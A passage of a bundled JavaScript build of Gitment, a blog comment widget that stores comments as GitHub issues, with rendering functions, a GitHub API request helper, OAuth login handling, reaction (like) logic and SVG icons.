    likeButton.classList.add('liked');
    likeButton.onclick = function () {
      return instance.unlike();
    };
  } else {
    likeButton.classList.remove('liked');
    likeButton.onclick = function () {
      return instance.like();
    };
  }
  container.appendChild(likeButton);

  var commentsCount = document.createElement('span');
  commentsCount.innerHTML = '\n    ' + (meta.comments ? ' \u2022 <strong>' + meta.comments + '</strong> Comments' : '') + '\n  ';
  container.appendChild(commentsCount);

  var issueLink = document.createElement('a');
  issueLink.className = 'gitment-header-issue-link';
  issueLink.href = meta.html_url;
  issueLink.target = '_blank';
  issueLink.innerText = 'Issue Page';
  container.appendChild(issueLink);

  return container;
}

function renderComments(_ref2, instance) {
  var meta = _ref2.meta,
      comments = _ref2.comments,
      commentReactions = _ref2.commentReactions,
      currentPage = _ref2.currentPage,
      user = _ref2.user,
      error = _ref2.error;

  var container = document.createElement('div');
  container.lang = "en-US";
  container.className = 'gitment-container gitment-comments-container';

  if (error) {
    var errorBlock = document.createElement('div');
    errorBlock.className = 'gitment-comments-error';

    if (error === _constants.NOT_INITIALIZED_ERROR && user.login && user.login.toLowerCase() === instance.owner.toLowerCase()) {
      var initHint = document.createElement('div');
      var initButton = document.createElement('button');
      initButton.className = 'gitment-comments-init-btn';
      initButton.onclick = function () {
        initButton.setAttribute('disabled', true);
        instance.init().catch(function (e) {
          initButton.removeAttribute('disabled');
          alert(e);
        });
      };
      initButton.innerText = 'Initialize Comments';
      initHint.appendChild(initButton);
      errorBlock.appendChild(initHint);
    } else {
      errorBlock.innerText = error;
    }
    container.appendChild(errorBlock);
    return container;
  } else if (comments === undefined) {
    var loading = document.createElement('div');
    loading.innerText = 'Loading comments...';
    loading.className = 'gitment-comments-loading';
    container.appendChild(loading);
    return container;
  } else if (!comments.length) {
    var emptyBlock = document.createElement('div');
    emptyBlock.className = 'gitment-comments-empty';
    emptyBlock.innerText = 'No Comment Yet';
    container.appendChild(emptyBlock);
    return container;
  }

  var commentsList = document.createElement('ul');
  commentsList.className = 'gitment-comments-list';

  comments.forEach(function (comment) {
    var createDate = new Date(comment.created_at);
    var updateDate = new Date(comment.updated_at);
    var commentItem = document.createElement('li');
    commentItem.className = 'gitment-comment';
    commentItem.innerHTML = '\n      <a class="gitment-comment-avatar" href="' + comment.user.html_url + '" target="_blank">\n        <img class="gitment-comment-avatar-img" src="' + comment.user.avatar_url + '"/>\n      </a>\n      <div class="gitment-comment-main">\n        <div class="gitment-comment-header">\n          <a class="gitment-comment-name" href="' + comment.user.html_url + '" target="_blank">\n            ' + comment.user.login + '\n          </a>\n          commented on\n          <span title="' + createDate + '">' + createDate.toDateString() + '</span>\n          ' + (createDate.toString() !== updateDate.toString() ? ' \u2022 <span title="comment was edited at ' + updateDate + '">edited</span>' : '') + '\n          <div class="gitment-comment-like-btn">' + _icons.heart + ' ' + (comment.reactions.heart || '') + '</div>\n        </div>\n        <div class="gitment-comment-body gitment-markdown article-entry">' + comment.body_html + '</div>\n      </div>\n    ';
    var likeButton = commentItem.querySelector('.gitment-comment-like-btn');
    var likedReaction = commentReactions[comment.id] && commentReactions[comment.id].find(function (reaction) {
      return reaction.content === 'heart' && reaction.user.login === user.login;
    });
    if (likedReaction) {
      likeButton.classList.add('liked');
      likeButton.onclick = function () {
        return instance.unlikeAComment(comment.id);
      };
    } else {
      likeButton.classList.remove('liked');
      likeButton.onclick = function () {
        return instance.likeAComment(comment.id);
      };
    }

    // dirty
    // use a blank image to trigger height calculating when element rendered
    var imgTrigger = document.createElement('img');
    var markdownBody = commentItem.querySelector('.gitment-comment-body');
    imgTrigger.className = 'gitment-hidden';
    imgTrigger.src = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==";
    imgTrigger.onload = function () {
      if (markdownBody.clientHeight > instance.maxCommentHeight) {
        markdownBody.classList.add('gitment-comment-body-folded');
        markdownBody.style.maxHeight = instance.maxCommentHeight + 'px';
        markdownBody.title = 'Click to Expand';
        markdownBody.onclick = function () {
          markdownBody.classList.remove('gitment-comment-body-folded');
          markdownBody.style.maxHeight = '';
          markdownBody.title = '';
          markdownBody.onclick = null;
        };
      }
    };
    commentItem.appendChild(imgTrigger);

    commentsList.appendChild(commentItem);
  });

  container.appendChild(commentsList);

  if (meta) {
    var pageCount = Math.ceil(meta.comments / instance.perPage);
    if (pageCount > 1) {
      var pagination = document.createElement('ul');
      pagination.className = 'gitment-comments-pagination';

      if (currentPage > 1) {
        var previousButton = document.createElement('li');
        previousButton.className = 'gitment-comments-page-item';
        previousButton.innerText = 'Previous';
        previousButton.onclick = function () {
          return instance.goto(currentPage - 1);
        };
        pagination.appendChild(previousButton);
      }

      var _loop = function _loop(i) {
        var pageItem = document.createElement('li');
        pageItem.className = 'gitment-comments-page-item';
        pageItem.innerText = i;
        pageItem.onclick = function () {
          return instance.goto(i);
        };
        if (currentPage === i) pageItem.classList.add('gitment-selected');
        pagination.appendChild(pageItem);
      };

      for (var i = 1; i <= pageCount; i++) {
        _loop(i);
      }

      if (currentPage < pageCount) {
        var nextButton = document.createElement('li');
        nextButton.className = 'gitment-comments-page-item';
        nextButton.innerText = 'Next';
        nextButton.onclick = function () {
          return instance.goto(currentPage + 1);
        };
        pagination.appendChild(nextButton);
      }

      container.appendChild(pagination);
    }
  }

  return container;
}

function renderEditor(_ref3, instance) {
  var user = _ref3.user,
      error = _ref3.error;

  var container = document.createElement('div');
  container.lang = "en-US";
  container.className = 'gitment-container gitment-editor-container';

  var shouldDisable = user.login && !error ? '' : 'disabled';
  var disabledTip = user.login ? '' : 'Login to Comment';
  container.innerHTML = '\n      ' + (user.login ? '<a class="gitment-editor-avatar" href="' + user.html_url + '" target="_blank">\n            <img class="gitment-editor-avatar-img" src="' + user.avatar_url + '"/>\n          </a>' : user.isLoggingIn ? '<div class="gitment-editor-avatar">' + _icons.spinner + '</div>' : '<a class="gitment-editor-avatar" href="' + instance.loginLink + '" title="login with GitHub">\n              ' + _icons.github + '\n            </a>') + '\n    </a>\n    <div class="gitment-editor-main">\n      <div class="gitment-editor-header">\n        <nav class="gitment-editor-tabs">\n          <button class="gitment-editor-tab gitment-selected">Write</button>\n          <button class="gitment-editor-tab">Preview</button>\n        </nav>\n        <div class="gitment-editor-login">\n          ' + (user.login ? '<a class="gitment-editor-logout-link">Logout</a>' : user.isLoggingIn ? 'Logging in...' : '<a class="gitment-editor-login-link" href="' + instance.loginLink + '">Login</a> with GitHub') + '\n        </div>\n      </div>\n      <div class="gitment-editor-body">\n        <div class="gitment-editor-write-field">\n          <textarea placeholder="Leave a comment" title="' + disabledTip + '" ' + shouldDisable + '></textarea>\n        </div>\n        <div class="gitment-editor-preview-field gitment-hidden">\n          <div class="gitment-editor-preview gitment-markdown"></div>\n        </div>\n      </div>\n    </div>\n    <div class="gitment-editor-footer">\n      <a class="gitment-editor-footer-tip" href="https://guides.github.com/features/mastering-markdown/" target="_blank">\n        Styling with Markdown is supported\n      </a>\n      <button class="gitment-editor-submit" title="' + disabledTip + '" ' + shouldDisable + '>Comment</button>\n    </div>\n  ';
  if (user.login) {
    container.querySelector('.gitment-editor-logout-link').onclick = function () {
      return instance.logout();
    };
  }

  var writeField = container.querySelector('.gitment-editor-write-field');
  var previewField = container.querySelector('.gitment-editor-preview-field');

  var textarea = writeField.querySelector('textarea');
  textarea.oninput = function () {
    textarea.style.height = 'auto';
    var style = window.getComputedStyle(textarea, null);
    var height = parseInt(style.height, 10);
    var clientHeight = textarea.clientHeight;
    var scrollHeight = textarea.scrollHeight;
    if (clientHeight < scrollHeight) {
      textarea.style.height = height + scrollHeight - clientHeight + 'px';
    }
  };

  var _container$querySelec = container.querySelectorAll('.gitment-editor-tab'),
      _container$querySelec2 = _slicedToArray(_container$querySelec, 2),
      writeTab = _container$querySelec2[0],
      previewTab = _container$querySelec2[1];

  writeTab.onclick = function () {
    writeTab.classList.add('gitment-selected');
    previewTab.classList.remove('gitment-selected');
    writeField.classList.remove('gitment-hidden');
    previewField.classList.add('gitment-hidden');

    textarea.focus();
  };
  previewTab.onclick = function () {
    previewTab.classList.add('gitment-selected');
    writeTab.classList.remove('gitment-selected');
    previewField.classList.remove('gitment-hidden');
    writeField.classList.add('gitment-hidden');

    var preview = previewField.querySelector('.gitment-editor-preview');
    var content = textarea.value.trim();
    if (!content) {
      preview.innerText = 'Nothing to preview';
      return;
    }

    preview.innerText = 'Loading preview...';
    instance.markdown(content).then(function (html) {
      return preview.innerHTML = html;
    });
  };

  var submitButton = container.querySelector('.gitment-editor-submit');
  submitButton.onclick = function () {
    submitButton.innerText = 'Submitting...';
    submitButton.setAttribute('disabled', true);
    instance.post(textarea.value.trim()).then(function (data) {
      textarea.value = '';
      textarea.style.height = 'auto';
      submitButton.removeAttribute('disabled');
      submitButton.innerText = 'Comment';
    }).catch(function (e) {
      alert(e);
      submitButton.removeAttribute('disabled');
      submitButton.innerText = 'Comment';
    });
  };

  return container;
}

function renderFooter() {
  var container = document.createElement('div');
  container.lang = "en-US";
  container.className = 'gitment-container gitment-footer-container';
  container.innerHTML = '\n    Powered by\n    <a class="gitment-footer-project-link" href="javascript:;" target="_blank">\n      Gitment\n    </a>\n  ';
  return container;
}

function render(state, instance) {
  var container = document.createElement('div');
  container.lang = "en-US";
  container.className = 'gitment-container gitment-root-container';
  container.appendChild(instance.renderHeader(state, instance));
  container.appendChild(instance.renderComments(state, instance));
  container.appendChild(instance.renderEditor(state, instance));
  container.appendChild(instance.renderFooter(state, instance));
  return container;
}

exports.default = { render: render, renderHeader: renderHeader, renderComments: renderComments, renderEditor: renderEditor, renderFooter: renderFooter };

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.http = exports.Query = exports.isString = undefined;

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

exports.getTargetContainer = getTargetContainer;

var _constants = __webpack_require__(0);

var isString = exports.isString = function isString(s) {
  return toString.call(s) === '[object String]';
};

function getTargetContainer(container) {
  var targetContainer = void 0;
  if (container instanceof Element) {
    targetContainer = container;
  } else if (isString(container)) {
    targetContainer = document.getElementById(container);
  } else {
    targetContainer = document.createElement('div');
  }

  return targetContainer;
}

var Query = exports.Query = {
  parse: function parse() {
    var search = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : window.location.search;

    if (!search) return {};
    var queryString = search[0] === '?' ? search.substring(1) : search;
    var query = {};
    queryString.split('&').forEach(function (queryStr) {
      var _queryStr$split = queryStr.split('='),
          _queryStr$split2 = _slicedToArray(_queryStr$split, 2),
          key = _queryStr$split2[0],
          value = _queryStr$split2[1];

      if (key) query[key] = value;
    });

    return query;
  },
  stringify: function stringify(query) {
    var prefix = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : '?';

    var queryString = Object.keys(query).map(function (key) {
      return key + '=' + encodeURIComponent(query[key] || '');
    }).join('&');
    return queryString ? prefix + queryString : '';
  }
};

function ajaxFactory(method) {
  return function (apiPath) {
    var data = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    var base = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 'https://api.github.com';

    var req = new XMLHttpRequest();
    var token = localStorage.getItem(_constants.LS_ACCESS_TOKEN_KEY);

    var url = '' + base + apiPath;
    var body = null;
    if (method === 'GET' || method === 'DELETE') {
      url += Query.stringify(data);
    }

    var p = new Promise(function (resolve, reject) {
      req.addEventListener('load', function () {
        var contentType = req.getResponseHeader('content-type');
        var res = req.responseText;
        if (!/json/.test(contentType)) {
          resolve(res);
          return;
        }
        var data = req.responseText ? JSON.parse(res) : {};
        if (data.message) {
          reject(new Error(data.message));
        } else {
          resolve(data);
        }
      });
      req.addEventListener('error', function (error) {
        return reject(error);
      });
    });
    req.open(method, url, true);

    req.setRequestHeader('Accept', 'application/vnd.github.squirrel-girl-preview, application/vnd.github.html+json');
    if (token) {
      req.setRequestHeader('Authorization', 'token ' + token);
    }
    if (method !== 'GET' && method !== 'DELETE') {
      body = JSON.stringify(data);
      req.setRequestHeader('Content-Type', 'application/json');
    }

    req.send(body);
    return p;
  };
}

var http = exports.http = {
  get: ajaxFactory('GET'),
  post: ajaxFactory('POST'),
  delete: ajaxFactory('DELETE'),
  put: ajaxFactory('PUT')
};

/***/ }),
/* 4 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var g;

// This works in non-strict mode
g = function () {
	return this;
}();

try {
	// This works if eval is allowed (see CSP)
	g = g || Function("return this")() || (1, eval)("this");
} catch (e) {
	// This works if the window reference is available
	if ((typeof window === "undefined" ? "undefined" : _typeof(window)) === "object") g = window;
}

// g can still be undefined, but nothing to do about it...
// We return undefined, instead of nothing here, so it's
// easier to handle this case. if(!global) { ...}

module.exports = g;

/***/ }),
/* 5 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _mobx = __webpack_require__(1);

var _constants = __webpack_require__(0);

var _utils = __webpack_require__(3);

var _default = __webpack_require__(2);

var _default2 = _interopRequireDefault(_default);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var scope = 'public_repo';

function extendRenderer(instance, renderer) {
  instance[renderer] = function (container) {
    var targetContainer = (0, _utils.getTargetContainer)(container);
    var render = instance.theme[renderer] || instance.defaultTheme[renderer];

    (0, _mobx.autorun)(function () {
      var e = render(instance.state, instance);
      if (targetContainer.firstChild) {
        targetContainer.replaceChild(e, targetContainer.firstChild);
      } else {
        targetContainer.appendChild(e);
      }
    });

    return targetContainer;
  };
}

var Gitment = function () {
  _createClass(Gitment, [{
    key: 'accessToken',
    get: function get() {
      return localStorage.getItem(_constants.LS_ACCESS_TOKEN_KEY);
    },
    set: function set(token) {
      localStorage.setItem(_constants.LS_ACCESS_TOKEN_KEY, token);
    }
  }, {
    key: 'loginLink',
    get: function get() {
      var oauthUri = 'https://github.com/login/oauth/authorize';
      var redirect_uri = this.oauth.redirect_uri || window.location.href;

      var oauthParams = Object.assign({
        scope: scope,
        redirect_uri: redirect_uri
      }, this.oauth);

      return '' + oauthUri + _utils.Query.stringify(oauthParams);
    }
  }]);

  function Gitment() {
    var _this = this;

    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

    _classCallCheck(this, Gitment);

    this.defaultTheme = _default2.default;
    this.useTheme(_default2.default);

    Object.assign(this, {
      id: window.location.href,
      title: window.document.title,
      link: window.location.href,
      desc: '',
      labels: [],
      theme: _default2.default,
      oauth: {},
      perPage: 20,
      maxCommentHeight: 250
    }, options);

    this.useTheme(this.theme);

    var user = {};
    try {
      var userInfo = localStorage.getItem(_constants.LS_USER_KEY);
      if (this.accessToken && userInfo) {
        Object.assign(user, JSON.parse(userInfo), {
          fromCache: true
        });
      }
    } catch (e) {
      localStorage.removeItem(_constants.LS_USER_KEY);
    }

    this.state = (0, _mobx.observable)({
      user: user,
      error: null,
      meta: {},
      comments: undefined,
      reactions: [],
      commentReactions: {},
      currentPage: 1
    });

    var query = _utils.Query.parse();
    if (query.code) {
      var _oauth = this.oauth,
          client_id = _oauth.client_id,
          client_secret = _oauth.client_secret;

      var code = query.code;
      delete query.code;
      var search = _utils.Query.stringify(query);
      var replacedUrl = '' + window.location.origin + window.location.pathname + search + window.location.hash;
      history.replaceState({}, '', replacedUrl);

      Object.assign(this, {
        id: replacedUrl,
        link: replacedUrl
      }, options);

      this.state.user.isLoggingIn = true;
      _utils.http.post('https://gh-oauth.imsun.net', {
        code: code,
        client_id: client_id,
        client_secret: client_secret
      }, '').then(function (data) {
        _this.accessToken = data.access_token;
        _this.update();
      }).catch(function (e) {
        _this.state.user.isLoggingIn = false;
        alert(e);
      });
    } else {
      this.update();
    }
  }

  _createClass(Gitment, [{
    key: 'init',
    value: function init() {
      var _this2 = this;

      return this.createIssue().then(function () {
        return _this2.loadComments();
      }).then(function (comments) {
        _this2.state.error = null;
        return comments;
      });
    }
  }, {
    key: 'useTheme',
    value: function useTheme() {
      var _this3 = this;

      var theme = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

      this.theme = theme;

      var renderers = Object.keys(this.theme);
      renderers.forEach(function (renderer) {
        return extendRenderer(_this3, renderer);
      });
    }
  }, {
    key: 'update',
    value: function update() {
      var _this4 = this;

      return Promise.all([this.loadMeta(), this.loadUserInfo()]).then(function () {
        return Promise.all([_this4.loadComments().then(function () {
          return _this4.loadCommentReactions();
        }), _this4.loadReactions()]);
      }).catch(function (e) {
        return _this4.state.error = e;
      });
    }
  }, {
    key: 'markdown',
    value: function markdown(text) {
      return _utils.http.post('/markdown', {
        text: text,
        mode: 'gfm'
      });
    }
  }, {
    key: 'createIssue',
    value: function createIssue() {
      var _this5 = this;

      var id = this.id,
          owner = this.owner,
          repo = this.repo,
          title = this.title,
          link = this.link,
          desc = this.desc,
          labels = this.labels;


      return _utils.http.post('/repos/' + owner + '/' + repo + '/issues', {
        title: title,
        labels: labels.concat(['gitment', id]),
        body: link + '\n\n' + desc
      }).then(function (meta) {
        _this5.state.meta = meta;
        return meta;
      });
    }
  }, {
    key: 'getIssue',
    value: function getIssue() {
      if (this.state.meta.id) return Promise.resolve(this.state.meta);

      return this.loadMeta();
    }
  }, {
    key: 'post',
    value: function post(body) {
      var _this6 = this;

      return this.getIssue().then(function (issue) {
        return _utils.http.post(issue.comments_url, { body: body }, '');
      }).then(function (data) {
        _this6.state.meta.comments++;
        var pageCount = Math.ceil(_this6.state.meta.comments / _this6.perPage);
        if (_this6.state.currentPage === pageCount) {
          _this6.state.comments.push(data);
        }
        return data;
      });
    }
  }, {
    key: 'loadMeta',
    value: function loadMeta() {
      var _this7 = this;

      var id = this.id,
          owner = this.owner,
          repo = this.repo;

      return _utils.http.get('/repos/' + owner + '/' + repo + '/issues', {
        creator: owner,
        labels: id
      }).then(function (issues) {
        if (!issues.length) return Promise.reject(_constants.NOT_INITIALIZED_ERROR);
        _this7.state.meta = issues[0];
        return issues[0];
      });
    }
  }, {
    key: 'loadComments',
    value: function loadComments() {
      var _this8 = this;

      var page = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : this.state.currentPage;

      return this.getIssue().then(function (issue) {
        return _utils.http.get(issue.comments_url, { page: page, per_page: _this8.perPage }, '');
      }).then(function (comments) {
        _this8.state.comments = comments;
        return comments;
      });
    }
  }, {
    key: 'loadUserInfo',
    value: function loadUserInfo() {
      var _this9 = this;

      if (!this.accessToken) {
        this.logout();
        return Promise.resolve({});
      }

      return _utils.http.get('/user').then(function (user) {
        _this9.state.user = user;
        localStorage.setItem(_constants.LS_USER_KEY, JSON.stringify(user));
        return user;
      });
    }
  }, {
    key: 'loadReactions',
    value: function loadReactions() {
      var _this10 = this;

      if (!this.accessToken) {
        this.state.reactions = [];
        return Promise.resolve([]);
      }

      return this.getIssue().then(function (issue) {
        if (!issue.reactions.total_count) return [];
        return _utils.http.get(issue.reactions.url, {}, '');
      }).then(function (reactions) {
        _this10.state.reactions = reactions;
        return reactions;
      });
    }
  }, {
    key: 'loadCommentReactions',
    value: function loadCommentReactions() {
      var _this11 = this;

      if (!this.accessToken) {
        this.state.commentReactions = {};
        return Promise.resolve([]);
      }

      var comments = this.state.comments;
      var comentReactions = {};

      return Promise.all(comments.map(function (comment) {
        if (!comment.reactions.total_count) return [];

        var owner = _this11.owner,
            repo = _this11.repo;

        return _utils.http.get('/repos/' + owner + '/' + repo + '/issues/comments/' + comment.id + '/reactions', {});
      })).then(function (reactionsArray) {
        comments.forEach(function (comment, index) {
          comentReactions[comment.id] = reactionsArray[index];
        });
        _this11.state.commentReactions = comentReactions;

        return comentReactions;
      });
    }
  }, {
    key: 'login',
    value: function login() {
      window.location.href = this.loginLink;
    }
  }, {
    key: 'logout',
    value: function logout() {
      localStorage.removeItem(_constants.LS_ACCESS_TOKEN_KEY);
      localStorage.removeItem(_constants.LS_USER_KEY);
      this.state.user = {};
    }
  }, {
    key: 'goto',
    value: function goto(page) {
      this.state.currentPage = page;
      this.state.comments = undefined;
      return this.loadComments(page);
    }
  }, {
    key: 'like',
    value: function like() {
      var _this12 = this;

      if (!this.accessToken) {
        alert('Login to Like');
        return Promise.reject();
      }

      var owner = this.owner,
          repo = this.repo;


      return _utils.http.post('/repos/' + owner + '/' + repo + '/issues/' + this.state.meta.number + '/reactions', {
        content: 'heart'
      }).then(function (reaction) {
        _this12.state.reactions.push(reaction);
        _this12.state.meta.reactions.heart++;
      });
    }
  }, {
    key: 'unlike',
    value: function unlike() {
      var _this13 = this;

      if (!this.accessToken) return Promise.reject();

      var _state = this.state,
          user = _state.user,
          reactions = _state.reactions;

      var index = reactions.findIndex(function (reaction) {
        return reaction.user.login === user.login;
      });
      return _utils.http.delete('/reactions/' + reactions[index].id).then(function () {
        reactions.splice(index, 1);
        _this13.state.meta.reactions.heart--;
      });
    }
  }, {
    key: 'likeAComment',
    value: function likeAComment(commentId) {
      var _this14 = this;

      if (!this.accessToken) {
        alert('Login to Like');
        return Promise.reject();
      }

      var owner = this.owner,
          repo = this.repo;

      var comment = this.state.comments.find(function (comment) {
        return comment.id === commentId;
      });

      return _utils.http.post('/repos/' + owner + '/' + repo + '/issues/comments/' + commentId + '/reactions', {
        content: 'heart'
      }).then(function (reaction) {
        _this14.state.commentReactions[commentId].push(reaction);
        comment.reactions.heart++;
      });
    }
  }, {
    key: 'unlikeAComment',
    value: function unlikeAComment(commentId) {
      if (!this.accessToken) return Promise.reject();

      var reactions = this.state.commentReactions[commentId];
      var comment = this.state.comments.find(function (comment) {
        return comment.id === commentId;
      });
      var user = this.state.user;

      var index = reactions.findIndex(function (reaction) {
        return reaction.user.login === user.login;
      });

      return _utils.http.delete('/reactions/' + reactions[index].id).then(function () {
        reactions.splice(index, 1);
        comment.reactions.heart--;
      });
    }
  }]);

  return Gitment;
}();

module.exports = Gitment;

/***/ }),
/* 6 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
/**
 * Modified from https://github.com/evil-icons/evil-icons
 */

var close = exports.close = '<svg class="gitment-close-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50"><path d="M37.304 11.282l1.414 1.414-26.022 26.02-1.414-1.413z"/><path d="M12.696 11.282l26.022 26.02-1.414 1.415-26.022-26.02z"/></svg>';
var github = exports.github = '<svg  class="gitment-github-icon" t="1494034595450" class="icon" style="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1138" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M943.835 580.562l-83.911 102.33 33.769 3.07s-105.4 85.958-200.568 91.074c-94.144 5.117-140.193-120.75-140.193-120.75v-210.8h126.89V382.04h-120.75v-83.91c52.188-17.396 90.05-67.538 90.05-126.89 0-73.678-60.375-134.053-134.053-134.053H512c-73.678 0-134.053 60.375-134.053 134.053 0 59.352 37.863 109.494 90.051 126.89v83.911h-120.75v63.445h126.89v210.801s-46.049 125.867-141.216 120.75c-96.19-5.116-201.591-91.074-201.591-91.074l33.769-3.07-84.935-102.33-28.652 123.82 36.839-8.187s72.654 126.89 182.148 176.009c109.494 50.142 221.034 111.54 242.524 114.61h1.023c22.513-3.07 133.03-64.468 241.5-114.61 107.448-49.119 180.102-176.009 180.102-176.009l36.84 8.187-28.653-123.82-0.001-0.001zM514.046 244.917H512c-39.908 0-72.654-32.746-72.654-73.678 0-39.909 32.746-72.655 72.654-72.655h3.07c39.91 0 72.655 32.746 72.655 72.655 0 40.932-32.746 73.678-72.655 73.678H514.046z" fill="#3F3F3F" p-id="1139"></path></svg>';
var heart = exports.heart = '<svg class="gitment-heart-icon" t="1494035578337" class="icon" style="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5306" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M487.404 503.402c-48.12-48.12-126.136-48.12-174.258 0l-43.564 43.564-43.564-43.564c-48.12-48.12-126.136-48.12-174.258 0-48.118 48.118-48.12 126.136 0 174.258l217.82 217.82L487.4 677.66c48.126-48.122 48.126-126.138 0.004-174.258z" fill="#FAEDD6" p-id="5307"></path><path d="M979.222 642.118c-29.126-29.126-76.346-29.126-105.472 0l-26.368 26.368-26.368-26.368c-29.126-29.126-76.346-29.126-105.472 0-29.124 29.124-29.126 76.346 0 105.472l131.84 131.84 131.84-131.84c29.124-29.126 29.124-76.346 0-105.472z" fill="#FA004B" p-id="5308"></path><path d="M494.284 670.78l3.746-4.496c42.714-51.258 37.272-127.112-12.322-171.746-42.17-37.952-104.702-42.488-151.908-11.018l-16.066 10.712-18.364-18.364c-80.456-80.454-82.85-211.552-2.932-292.544 80.44-81.524 211.742-81.856 292.598-1l33.646 33.646 31.708-31.708c80.454-80.454 211.55-82.848 292.542-2.934 81.524 80.44 81.858 211.742 1 292.6l-148.702 148.702c-17.728-17.728-46.472-17.728-64.2 0l-32.1 32.1c-17.728 17.728-17.728 46.472 0 64.2L622.68 799.18l-128.396-128.4" fill="#36C9A3" p-id="5309"></path><path d="M943.304 302.042H911.96c0-43.88-36.592-81.04-80.474-81.04V189.66c60.6-0.004 111.818 49.696 111.818 112.382z" fill="#FFFFFF" p-id="5310"></path><path d="M926.486 604.604c-24.108 0-46.77 9.388-63.818 26.434l-15.286 15.286-15.286-15.286a90.368 90.368 0 0 0-10.272-8.836l137.19-137.19C1000.922 443.102 1024 387.388 1024 328.124s-23.078-114.978-64.984-156.884c-86.506-86.506-227.264-86.506-313.768 0l-22.566 22.566-22.564-22.566c-86.506-86.506-227.264-86.506-313.768 0-41.906 41.904-64.984 97.62-64.984 156.884s23.078 114.978 64.984 156.884l11.514 11.514-28.28 28.28-32.482-32.482c-26.232-26.232-61.112-40.68-98.21-40.68s-71.978 14.448-98.21 40.68C14.448 518.552 0 553.43 0 590.528s14.448 71.978 40.68 98.21L269.582 917.64l224.7-224.7 128.4 128.4 72.932-72.932a91.28 91.28 0 0 0 8.848 10.262l142.92 142.92 142.92-142.92c35.188-35.188 35.188-92.444 0-127.636-17.046-17.042-39.708-26.43-63.816-26.43zM269.584 873.316l-206.74-206.74c-20.312-20.312-31.5-47.32-31.5-76.048s11.188-55.734 31.5-76.046c20.966-20.966 48.508-31.45 76.048-31.45s55.082 10.484 76.048 31.45l54.644 54.644 54.646-54.644c41.932-41.932 110.162-41.932 152.094 0s41.932 110.162 0 152.094l-206.74 206.74z m353.1-96.3l-107.888-107.89c15.826-22.958 24.372-50.114 24.372-78.598 0-37.098-14.448-71.978-40.68-98.21s-61.112-40.68-98.21-40.68c-28.482 0-55.638 8.546-78.598 24.372l-13.166-13.166c-35.984-35.984-55.804-83.83-55.804-134.72s19.818-98.736 55.804-134.72c74.286-74.286 195.158-74.286 269.442 0l44.728 44.728 44.73-44.728c74.286-74.286 195.158-74.286 269.442 0s74.284 195.158 0 269.442l-144.95 144.95c-30.184-8.134-63.792-0.406-87.442 23.242-17.046 17.046-26.436 39.71-26.436 63.818 0 8.11 1.086 16.048 3.144 23.672l-58.488 58.488z m345.456-40.508l-120.758 120.758-120.758-120.758c-11.128-11.128-17.254-25.92-17.254-41.656 0-15.734 6.128-30.526 17.254-41.654 11.484-11.484 26.568-17.226 41.656-17.226 15.084 0 30.17 5.742 41.654 17.226l37.45 37.45 37.45-37.45c22.97-22.966 60.34-22.964 83.31 0 22.964 22.97 22.964 60.344-0.004 83.31z" fill="#232323" p-id="5311"></path><path d="M461.806 590.404h-31.344c0-18.806-14.798-32.35-31.514-32.35v-31.344c33.432-0.002 62.858 28.17 62.858 63.694zM932.63 713.946l-32.1-32.1 22.164-22.162 32.1 32.1z" fill="#FFFFFF" p-id="5312"></path></svg>';
